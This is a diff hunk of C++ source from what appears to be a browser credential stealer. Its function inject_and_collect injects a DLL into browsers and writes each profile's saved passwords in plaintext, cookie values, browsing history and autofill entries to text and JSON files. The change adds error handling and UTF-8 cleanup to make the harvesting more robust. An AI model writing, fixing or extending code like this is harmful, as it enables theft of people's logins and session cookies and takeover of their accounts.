@@ -531,52 +531,56 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
             fs::path profile_dir = browser_dir / p_name_sanitized;
             fs::create_directories(profile_dir);
 
-            std::ofstream pass_file(profile_dir / "passwords.txt");
-            for (auto& p : p_data.passwords) pass_file << "URL: " << p.url << "\nUser: " << p.username << "\nPass: " << p.password << "\n\n";
-            pass_file.close();
+            try {
+                std::ofstream pass_file(profile_dir / "passwords.txt");
+                for (auto& p : p_data.passwords) pass_file << "URL: " << p.url << "\nUser: " << p.username << "\nPass: " << p.password << "\n\n";
+                pass_file.close();
 
-            std::ofstream cookie_file(profile_dir / "cookies.txt");
-            json cookie_json_list = json::array();
-            for (auto& c : p_data.cookies) {
-                cookie_file << "Host: " << c.host << " | Name: " << c.name << " | Value: " << c.value << "\n";
-                json cj;
-                std::string host_raw = c.host;
-                if (host_raw.find("http") != 0) host_raw = "https://" + (host_raw[0] == '.' ? host_raw.substr(1) : host_raw);
-                if (host_raw.back() != '/') host_raw += "/";
-                cj["Host raw"] = host_raw;
-                cj["Name raw"] = c.name;
-                cj["Path raw"] = c.path;
-                cj["Content raw"] = c.value;
-                long long unix_ts = (c.expires_utc / 1000000) - 11644473600LL;
-                std::time_t t = (std::time_t)unix_ts;
-                struct tm *tm_ptr = std::gmtime(&t);
-                char date_buf[64];
-                if (tm_ptr && std::strftime(date_buf, sizeof(date_buf), "%d-%m-%Y %H:%M:%S", tm_ptr)) cj["Expires"] = std::string(date_buf);
-                cj["Expires raw"] = std::to_string(unix_ts);
-                cj["Send for"] = c.is_secure ? "Encrypted connections only" : "Any type of connection";
-                cj["Send for raw"] = c.is_secure ? "true" : "false";
-                cj["HTTP only raw"] = c.is_httponly ? "true" : "false";
-                std::string ss_str = "no_restriction";
-                if (c.samesite == 1) ss_str = "lax";
-                else if (c.samesite == 2) ss_str = "strict";
-                cj["SameSite raw"] = ss_str;
-                cj["This domain only"] = (c.host[0] == '.') ? "Valid for subdomains" : "Valid for host only";
-                cj["This domain only raw"] = (c.host[0] == '.') ? "false" : "true";
-                cj["First Party Domain"] = "";
-                cookie_json_list.push_back(cj);
+                std::ofstream cookie_file(profile_dir / "cookies.txt");
+                json cookie_json_list = json::array();
+                for (auto& c : p_data.cookies) {
+                    cookie_file << "Host: " << c.host << " | Name: " << c.name << " | Value: " << c.value << "\n";
+                    json cj;
+                    std::string host_raw = c.host;
+                    if (host_raw.find("http") != 0) host_raw = "https://" + (host_raw[0] == '.' ? host_raw.substr(1) : host_raw);
+                    if (host_raw.back() != '/') host_raw += "/";
+                    cj["Host raw"] = ensure_utf8(host_raw);
+                    cj["Name raw"] = ensure_utf8(c.name);
+                    cj["Path raw"] = ensure_utf8(c.path);
+                    cj["Content raw"] = ensure_utf8(c.value);
+                    long long unix_ts = (c.expires_utc / 1000000) - 11644473600LL;
+                    std::time_t t = (std::time_t)unix_ts;
+                    struct tm *tm_ptr = std::gmtime(&t);
+                    char date_buf[64];
+                    if (tm_ptr && std::strftime(date_buf, sizeof(date_buf), "%d-%m-%Y %H:%M:%S", tm_ptr)) cj["Expires"] = std::string(date_buf);
+                    cj["Expires raw"] = std::to_string(unix_ts);
+                    cj["Send for"] = c.is_secure ? "Encrypted connections only" : "Any type of connection";
+                    cj["Send for raw"] = c.is_secure ? "true" : "false";
+                    cj["HTTP only raw"] = c.is_httponly ? "true" : "false";
+                    std::string ss_str = "no_restriction";
+                    if (c.samesite == 1) ss_str = "lax";
+                    else if (c.samesite == 2) ss_str = "strict";
+                    cj["SameSite raw"] = ss_str;
+                    cj["This domain only"] = (c.host[0] == '.') ? "Valid for subdomains" : "Valid for host only";
+                    cj["This domain only raw"] = (c.host[0] == '.') ? "false" : "true";
+                    cj["First Party Domain"] = "";
+                    cookie_json_list.push_back(cj);
+                }
+                cookie_file.close();
+
+                std::ofstream(profile_dir / "cookies.json") << cookie_json_list.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
+                json pj_pass = json::array();
+                for (auto& p : p_data.passwords) pj_pass.push_back({{"url", ensure_utf8(p.url)}, {"username", ensure_utf8(p.username)}, {"password", ensure_utf8(p.password)}});
+                std::ofstream(profile_dir / "passwords.json") << pj_pass.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
+                json pj_hist = json::array();
+                for (auto& h : p_data.history) pj_hist.push_back({{"url", ensure_utf8(h.url)}, {"title", ensure_utf8(h.title)}, {"visit_count", h.visit_count}});
+                std::ofstream(profile_dir / "history.json") << pj_hist.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
+                json pj_auto = json::array();
+                for (auto& a : p_data.autofill) pj_auto.push_back({{"name", ensure_utf8(a.name)}, {"value", ensure_utf8(a.value)}});
+                std::ofstream(profile_dir / "autofill.json") << pj_auto.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
+            } catch (const std::exception& e) {
+                std::cerr << "Error processing profile " << profile << ": " << e.what() << std::endl;
             }
-            cookie_file.close();
-
-            std::ofstream(profile_dir / "cookies.json") << cookie_json_list.dump(4);
-            json pj_pass = json::array();
-            for (auto& p : p_data.passwords) pj_pass.push_back({{"url", p.url}, {"username", p.username}, {"password", p.password}});
-            std::ofstream(profile_dir / "passwords.json") << pj_pass.dump(4);
-            json pj_hist = json::array();
-            for (auto& h : p_data.history) pj_hist.push_back({{"url", h.url}, {"title", h.title}, {"visit_count", h.visit_count}});
-            std::ofstream(profile_dir / "history.json") << pj_hist.dump(4);
-            json pj_auto = json::array();
-            for (auto& a : p_data.autofill) pj_auto.push_back({{"name", a.name}, {"value", a.value}});
-            std::ofstream(profile_dir / "autofill.json") << pj_auto.dump(4);
 
             std::cout << "[+] Saved data for profile: " << profile << std::endl;
         }
